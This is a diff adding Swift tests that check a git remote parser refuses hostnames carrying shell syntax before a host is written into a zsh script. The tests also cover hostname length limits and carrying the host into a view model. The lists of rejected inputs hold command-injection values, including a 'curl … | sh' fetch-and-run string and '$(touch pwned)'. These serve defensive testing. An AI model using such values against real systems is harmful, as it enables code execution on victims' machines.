@@ -144,3 +144,131 @@ struct GitHubSlugTests {
         #expect(GitHubSlug(remoteURL: remote) == nil, "\(remote) should not parse as a slug")
     }
 }
+
+// codex BLOCKER 1 / REVIEW CR-01. `host` reaches `Actions.writeSignInScript`, which writes zsh
+// source, so a host is not merely displayed text: it is the one repo-controlled value that used to
+// reach a shell. `isValidHostname` is the grammar every decode boundary applies, and
+// `init?(remoteURL:)` returns nil rather than carrying a host that fails it.
+@Suite("GitHubSlug refuses a host that is not a hostname")
+struct GitHubSlugHostnameTests {
+
+    @Test("hostWithShellMetacharactersIsRejected", arguments: [
+        "https://$(touch pwned)/owner/repo.git",
+        "ssh://git@$(touch pwned)/owner/repo.git",
+        "https://github.com;curl https://x/p|sh/o/n",
+        "https://github.com;id/o/n",
+        "https://a$(id).com/o/n",
+        "https://a b.com/o/n",
+        "https://git\"hub.com/o/n",
+        "https://git'hub.com/o/n",
+        "https://git`id`hub.com/o/n",
+        "https://git\nhub.com/o/n",
+        "https://github.com&/o/n",
+        "https://-github.com/o/n",
+        "https://github-.com/o/n",
+        "https://github..com/o/n",
+        "https://github.com./o/n",
+        "git@github.com;id:owner/repo.git",
+    ])
+    func hostWithShellMetacharactersIsRejected(_ remote: String) {
+        #expect(GitHubSlug(remoteURL: remote) == nil, "\(remote) parsed to a slug; its host is not a hostname")
+    }
+
+    @Test("The hostname grammar accepts what git remotes really carry", arguments: [
+        "github.com",
+        "github.nytimes.com",
+        "localhost",
+        "my-host-1.example.co.uk",
+        "a",
+        "1.2.3.4",
+    ])
+    func acceptsRealHostnames(_ host: String) {
+        #expect(GitHubSlug.isValidHostname(host), "\(host) is a hostname and was rejected")
+    }
+
+    @Test("The hostname grammar refuses everything a shell would read as syntax", arguments: [
+        "",
+        " ",
+        "github.com;id",
+        "$(touch pwned)",
+        "`id`",
+        "a b.com",
+        "a\tb.com",
+        "a\nb.com",
+        "host|pipe.com",
+        "host&.com",
+        "host'quote.com",
+        "host\"quote.com",
+        "host\\escape.com",
+        "-leading.com",
+        "trailing-.com",
+        "double..dot.com",
+        "trailing.dot.com.",
+        ".leading.dot.com",
+        "host_underscore.com",
+        "host:1234",
+        "host/path",
+    ])
+    func refusesNonHostnames(_ host: String) {
+        #expect(!GitHubSlug.isValidHostname(host), "\(host) is not a hostname and was accepted")
+    }
+
+    @Test("A label over 63 characters, or a name over 253, is refused")
+    func lengthLimits() {
+        let label63 = String(repeating: "a", count: 63)
+        let label64 = String(repeating: "a", count: 64)
+        #expect(GitHubSlug.isValidHostname("\(label63).com"))
+        #expect(!GitHubSlug.isValidHostname("\(label64).com"))
+
+        // 4 × 63 + 3 dots = 255 characters, over the 253 limit, with every label legal.
+        let tooLong = Array(repeating: label63, count: 4).joined(separator: ".")
+        #expect(tooLong.count == 255)
+        #expect(!GitHubSlug.isValidHostname(tooLong))
+    }
+}
+
+// codex MINOR 3. The validated host has to reach the shell, because `Actions.openPR` refuses a PR
+// link whose host is not the repo's own. `RepoSectionVM.host` is that carrier, and it is filled
+// from the slug rather than re-parsed from the link — a tampered cache can rewrite the link, and
+// the point of the check is that the link is not what decides where it may point.
+@Suite("The validated host reaches the view model the shell opens PRs from")
+struct RepoSectionHostTests {
+
+    @Test("A repo with a GitHub remote carries its host onto the section")
+    func sectionCarriesTheSlugHost() throws {
+        let repo = Repo(
+            id: RepoID(commonDir: "/repos/branchbar/.git"),
+            name: "branchbar",
+            path: "/repos/branchbar",
+            remoteURL: "https://github.nytimes.com/newsroom/tooling.git",
+            githubSlug: GitHubSlug(remoteURL: "https://github.nytimes.com/newsroom/tooling.git"))
+
+        let vm = SnapshotPresenter().present(
+            Snapshot(repos: [repo]),
+            refreshState: .idle(lastRefreshedAt: nil),
+            collapsedRepoIDs: [],
+            scanResult: nil,
+            appVersion: "0.9.0",
+            now: Date(timeIntervalSince1970: 1_788_400_000))
+
+        #expect(vm.sections.first?.host == "github.nytimes.com")
+    }
+
+    @Test("A repo with no GitHub remote carries no host, so no PR link can be opened for it")
+    func sectionWithoutASlugCarriesNoHost() throws {
+        let repo = Repo(
+            id: RepoID(commonDir: "/repos/notes/.git"),
+            name: "notes",
+            path: "/repos/notes")
+
+        let vm = SnapshotPresenter().present(
+            Snapshot(repos: [repo]),
+            refreshState: .idle(lastRefreshedAt: nil),
+            collapsedRepoIDs: [],
+            scanResult: nil,
+            appVersion: "0.9.0",
+            now: Date(timeIntervalSince1970: 1_788_400_000))
+
+        #expect(vm.sections.first?.host == nil)
+    }
+}
